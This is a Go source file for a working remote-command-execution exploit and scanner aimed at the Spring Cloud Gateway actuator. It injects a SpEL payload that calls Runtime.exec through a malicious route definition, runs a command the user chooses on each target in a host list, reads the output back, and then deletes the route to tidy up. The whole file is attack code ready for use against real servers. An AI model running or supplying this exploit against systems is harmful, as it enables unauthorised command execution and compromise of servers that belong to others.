package main

import (
	"bufio"
	"flag"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func main(){

	var host string
	var cmd string
	var results []string
	flag.StringVar(&host,"host","http://127.0.0.1:80","待检测地址或者存放文件路径")
	flag.StringVar(&cmd , "cmd","id","执行命令")

	flag.Parse()

	file ,err := os.Open(host)
	if err != nil{
		res := check(host,cmd)
		if res != "" {
			results = append(results,res)
		}
	}else {
		fs := bufio.NewScanner(file)
		for fs.Scan(){
			res := check(fs.Text(),cmd)
			if res != "" {
				results = append(results,res)
			}
		}
	}
	println("vulnerable host:")
	for _,v := range results{
		println(v)
	}

}
func check(host,cmd string) string{
	var err error

	err = firstreq(host,cmd)
	if err != nil {
		return ""
	}
	err =secondreq(host)
	if err != nil {
		return ""
	}
	err , res := thirdreq(host)
	if err == nil {
		return res
	}
	err = forth(host)
	if err != nil {
		return ""
	}
	err = secondreq(host)
	if err != nil {
		return ""
	}
	return ""
}



func firstreq(host string,cmd string) error{
	body := `{
		"id": "hacktest",
		"filters": [{
		"name": "AddResponseHeader",
		"args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"`+cmd+`\"}).getInputStream()))}"}
	}],
	"uri": "http://example.com",
	"order": 0
	}`
	//println(body)
	_ , err := http.Post(host + "/actuator/gateway/routes/hacktest","application/json",strings.NewReader(body))
	if err != nil{
		return err
	}
	//_ ,err = ioutil.ReadAll(resp.Body)
	//if err != nil{
	//	println(err.Error())
	//}
	//println("post:",resp.Status)
	//println("post:",string(b))
	return nil

}

func secondreq(host string)error{
	_ , err := http.Post(host+"/actuator/gateway/refresh","application/x-www-form-urlencoded",strings.NewReader(""))
	if err != nil{
		return err
	}
	return nil
	//_ ,err = ioutil.ReadAll(resp.Body)
	//
	//if err != nil{
	//	return err
	//}
	//println("fresh:",resp.Status)
	//println("fresh:",string(b))
}

func thirdreq(host string) (error,string){
	resp , err := http.Get(host+"/actuator/gateway/routes/hacktest")
	if err != nil{
		println(err.Error())
	}
	b ,err := ioutil.ReadAll(resp.Body)
	if err != nil{
		return err,""
	}
	//println("get:",resp.Status)
	println("result: ",host," : ",string(b))
	if strings.Contains(string(b),"uid") {
		return nil,host
	}
	return nil,""
}

func forth(host string)error{
	r , e := http.NewRequest("DELETE",host+"/actuator/gateway/routes/hacktest",nil)
	if e != nil{
		println(e.Error())
	}
	_ , err := http.DefaultClient.Do(r)
	if err != nil{
		return err
	}
	//_ ,err = ioutil.ReadAll(resp.Body)
	//
	//if err != nil{
	//	return err
	//}
	//println("delete",resp.Status)
	//println("delete:",string(b))
	return nil
}
